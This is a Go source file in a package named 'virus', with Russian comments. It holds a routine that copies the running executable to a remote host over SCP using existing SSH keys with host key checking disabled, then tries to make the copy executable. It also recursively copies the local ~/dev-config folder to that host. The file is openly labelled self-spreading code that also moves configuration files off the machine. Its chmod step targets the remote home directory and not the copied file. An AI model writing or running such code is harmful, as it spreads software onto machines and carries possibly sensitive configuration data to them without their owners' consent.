package virus

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
)

// Virus копирует текущий исполняемый файл на удаленный сервер через SCP.
// Параметр path должен быть в формате "user@ip" или просто "ip".
// Используется аутентификация по SSH-ключам (пароль не поддерживается).
func Virus(path string) error {
	// Определяем путь к текущему исполняемому файлу
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("could not determine executable path: %v", err)
	}

	// Парсим строку подключения
	var username, host string
	if strings.Contains(path, "@") {
		parts := strings.Split(path, "@")
		if len(parts) != 2 {
			return fmt.Errorf("invalid path format. Expected user@ip")
		}
		username = parts[0]
		host = parts[1]
	} else {
		// Просто IP адрес или хостнейм, используем текущего пользователя
		host = path
		// Получаем текущего пользователя системы
		current, err := user.Current()
		if err != nil {
			// Fallback на переменную окружения
			username = os.Getenv("USER")
			if username == "" {
				username = "root"
			}
		} else {
			username = current.Username
		}
	}

	// Целевой путь на удалённом сервере
	remotePath := fmt.Sprintf("/home/%s", username)
	if username == "root" {
		remotePath = "/root"
	}

	// Строим команду SCP (без пароля, полагаемся на SSH-ключи)
	cmd := exec.Command("scp", "-o", "StrictHostKeyChecking=no", exe, fmt.Sprintf("%s@%s:%s", username, host, remotePath))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	fmt.Printf("Copying %s to %s@%s:%s...\n", filepath.Base(exe), username, host, remotePath)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("SCP failed: %v", err)
	}

	// Устанавливаем права на выполнение на удалённом сервере
	chmodCmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", fmt.Sprintf("%s@%s", username, host), "chmod", "+x", remotePath)
	chmodCmd.Stdout = os.Stdout
	chmodCmd.Stderr = os.Stderr
	if err := chmodCmd.Run(); err != nil {
		fmt.Printf("Warning: could not set executable permissions on remote server: %v\n", err)
	}

	// Копируем все конфиги из папки ~/dev-config на удалённый сервер
	if err := copyDevConfig(username, host, remotePath); err != nil {
		fmt.Printf("Warning: could not copy dev-config files: %v\n", err)
	}

	fmt.Printf("Successfully copied to %s:%s\n", host, remotePath)
	return nil
}

// copyDevConfig копирует всё содержимое локальной папки ~/dev-config
// в одноимённую папку dev-config в домашнем каталоге удалённого пользователя.
func copyDevConfig(username, host, remotePath string) error {
	// Определяем домашнюю директорию текущего пользователя
	home, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("could not determine home directory: %v", err)
	}

	// Путь к локальной папке с конфигами
	localConfigDir := filepath.Join(home, "dev-config")

	return copyDevConfigDir(localConfigDir, username, host, remotePath)
}

// copyDevConfigDir копирует всё содержимое локальной папки конфигов
// в одноимённую папку dev-config в домашнем каталоге удалённого пользователя.
func copyDevConfigDir(localConfigDir, username, host, remotePath string) error {
	// Проверяем, существует ли папка с конфигами
	info, err := os.Stat(localConfigDir)
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Printf("Config directory %s not found, skipping config copy.\n", localConfigDir)
			return nil
		}
		return fmt.Errorf("could not check config directory: %v", err)
	}
	if !info.IsDir() {
		return fmt.Errorf("path %s is not a directory", localConfigDir)
	}

	// Целевой путь на удалённом сервере: <remotePath>/dev-config
	remoteConfigDir := filepath.Join(remotePath, "dev-config")

	// Рекурсивно копируем папку dev-config (без пароля, полагаемся на SSH-ключи)
	fmt.Printf("Copying configs from %s to %s@%s:%s...\n", localConfigDir, username, host, remoteConfigDir)
	scpConfig := exec.Command("scp", "-r", "-o", "StrictHostKeyChecking=no", localConfigDir, fmt.Sprintf("%s@%s:%s", username, host, remotePath))
	scpConfig.Stdout = os.Stdout
	scpConfig.Stderr = os.Stderr
	if err := scpConfig.Run(); err != nil {
		return fmt.Errorf("config SCP failed: %v", err)
	}

	fmt.Printf("Configs successfully copied to %s:%s\n", host, remoteConfigDir)
	return nil
}
